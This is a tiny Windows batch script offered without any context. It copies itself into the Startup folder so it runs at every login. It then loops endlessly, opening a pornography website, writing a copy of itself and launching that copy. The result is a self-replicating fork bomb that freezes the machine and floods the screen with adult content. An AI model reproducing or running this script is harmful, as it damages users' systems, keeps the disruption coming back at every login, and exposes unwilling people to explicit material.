@echo off
copy "%~f0" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\"
:x
start https://pornhub.com
copy "%~f0" "kopia.bat" >nul
start "" "kopia.bat"
goto x